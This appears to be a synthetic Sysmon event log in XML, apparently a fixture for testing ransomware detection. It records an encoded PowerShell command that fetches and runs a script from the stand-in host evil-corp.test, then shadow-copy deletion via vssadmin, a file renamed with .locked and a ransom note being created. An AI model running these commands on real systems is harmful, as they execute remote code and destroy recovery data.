<?xml version="1.0" encoding="utf-8"?>
<Events>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-08-22T10:00:00.0000000Z" />
    <EventRecordID>2000</EventRecordID>
    <Correlation />
    <Execution ProcessID="1000" ThreadID="1000" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>LAPTOP-TEST</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-08-22 10:00:00.000</Data>
    <Data Name="ProcessGuid">{AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA}</Data>
    <Data Name="ProcessId">2000</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="FileVersion">10.0.19041.1</Data>
    <Data Name="Description">Windows PowerShell</Data>
    <Data Name="Product">Microsoft® Windows® Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">PowerShell.EXE</Data>
    <Data Name="CommandLine">powershell.exe -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAtAGMAbwByAHAALgB0AGUAcwB0AC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==</Data>
    <Data Name="CurrentDirectory">C:\Windows\</Data>
    <Data Name="User">TEST\Analyst</Data>
    <Data Name="LogonGuid">{33333333-3333-3333-3333-333333333333}</Data>
    <Data Name="LogonId">0x3e7</Data>
    <Data Name="TerminalSessionId">1</Data>
    <Data Name="IntegrityLevel">High</Data>
    <Data Name="Hashes">SHA1=1234567890ABCDEF1234567890ABCDEF12345678,MD5=1234567890ABCDEF1234567890ABCDEF,SHA256=1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF</Data>
    <Data Name="ParentProcessGuid">{11111111-1111-1111-1111-111111111111}</Data>
    <Data Name="ParentProcessId">1500</Data>
    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
    <Data Name="ParentCommandLine">cmd.exe /c start</Data>
  </EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
    <EventID>22</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>22</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-08-22T10:00:05.0000000Z" />
    <EventRecordID>2001</EventRecordID>
    <Correlation />
    <Execution ProcessID="1000" ThreadID="1000" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>LAPTOP-TEST</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-08-22 10:00:05.000</Data>
    <Data Name="ProcessGuid">{AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA}</Data>
    <Data Name="ProcessId">2000</Data>
    <Data Name="QueryName">evil-corp.test</Data>
    <Data Name="QueryStatus">0</Data>
    <Data Name="QueryResults">::ffff:203.0.113.55;</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
  </EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
    <EventID>3</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>3</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-08-22T10:00:06.0000000Z" />
    <EventRecordID>2002</EventRecordID>
    <Correlation />
    <Execution ProcessID="1000" ThreadID="1000" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>LAPTOP-TEST</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-08-22 10:00:06.000</Data>
    <Data Name="ProcessGuid">{AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA}</Data>
    <Data Name="ProcessId">2000</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="User">TEST\Analyst</Data>
    <Data Name="Protocol">tcp</Data>
    <Data Name="Initiated">true</Data>
    <Data Name="SourceIsIpv6">false</Data>
    <Data Name="SourceIp">192.168.1.100</Data>
    <Data Name="SourceHostname">LAPTOP-TEST.test.local</Data>
    <Data Name="SourcePort">49152</Data>
    <Data Name="SourcePortName">-</Data>
    <Data Name="DestinationIsIpv6">false</Data>
    <Data Name="DestinationIp">203.0.113.55</Data>
    <Data Name="DestinationHostname">evil-corp.test</Data>
    <Data Name="DestinationPort">443</Data>
    <Data Name="DestinationPortName">https</Data>
  </EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-08-22T10:00:10.0000000Z" />
    <EventRecordID>2003</EventRecordID>
    <Correlation />
    <Execution ProcessID="1000" ThreadID="1000" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>LAPTOP-TEST</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-08-22 10:00:10.000</Data>
    <Data Name="ProcessGuid">{BBBBBBBB-BBBB-BBBB-BBBB-BBBBBBBBBBBB}</Data>
    <Data Name="ProcessId">3000</Data>
    <Data Name="Image">C:\Windows\System32\vssadmin.exe</Data>
    <Data Name="FileVersion">10.0.19041.1</Data>
    <Data Name="Description">Command Line Interface for Microsoft® Volume Shadow Copy Service</Data>
    <Data Name="Product">Microsoft® Windows® Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">VSSADMIN.EXE</Data>
    <Data Name="CommandLine">vssadmin.exe delete shadows /all /quiet</Data>
    <Data Name="CurrentDirectory">C:\Windows\</Data>
    <Data Name="User">TEST\Analyst</Data>
    <Data Name="LogonGuid">{33333333-3333-3333-3333-333333333333}</Data>
    <Data Name="LogonId">0x3e7</Data>
    <Data Name="TerminalSessionId">1</Data>
    <Data Name="IntegrityLevel">High</Data>
    <Data Name="Hashes">SHA1=1234567890ABCDEF1234567890ABCDEF12345678</Data>
    <Data Name="ParentProcessGuid">{AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA}</Data>
    <Data Name="ParentProcessId">2000</Data>
    <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="ParentCommandLine">powershell.exe -NoProfile -enc ...</Data>
  </EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
    <EventID>11</EventID>
    <Version>2</Version>
    <Level>4</Level>
    <Task>11</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-08-22T10:00:15.0000000Z" />
    <EventRecordID>2004</EventRecordID>
    <Correlation />
    <Execution ProcessID="1000" ThreadID="1000" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>LAPTOP-TEST</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-08-22 10:00:15.000</Data>
    <Data Name="ProcessGuid">{AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA}</Data>
    <Data Name="ProcessId">2000</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="TargetFilename">C:\Users\Analyst\Documents\financial_record.xlsx.locked</Data>
    <Data Name="CreationUtcTime">2026-08-22 10:00:15.000</Data>
  </EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
    <EventID>23</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>23</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-08-22T10:00:16.0000000Z" />
    <EventRecordID>2005</EventRecordID>
    <Correlation />
    <Execution ProcessID="1000" ThreadID="1000" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>LAPTOP-TEST</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-08-22 10:00:16.000</Data>
    <Data Name="ProcessGuid">{AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA}</Data>
    <Data Name="ProcessId">2000</Data>
    <Data Name="User">TEST\Analyst</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="TargetFilename">C:\Users\Analyst\Documents\financial_record.xlsx</Data>
    <Data Name="Hashes">SHA1=1234567890ABCDEF1234567890ABCDEF12345678</Data>
    <Data Name="IsExecutable">false</Data>
    <Data Name="Archived">false</Data>
  </EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
    <EventID>11</EventID>
    <Version>2</Version>
    <Level>4</Level>
    <Task>11</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-08-22T10:00:20.0000000Z" />
    <EventRecordID>2006</EventRecordID>
    <Correlation />
    <Execution ProcessID="1000" ThreadID="1000" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>LAPTOP-TEST</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-08-22 10:00:20.000</Data>
    <Data Name="ProcessGuid">{AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA}</Data>
    <Data Name="ProcessId">2000</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="TargetFilename">C:\Users\Analyst\Documents\README_DECRYPT.txt</Data>
    <Data Name="CreationUtcTime">2026-08-22 10:00:20.000</Data>
  </EventData>
</Event>
</Events>
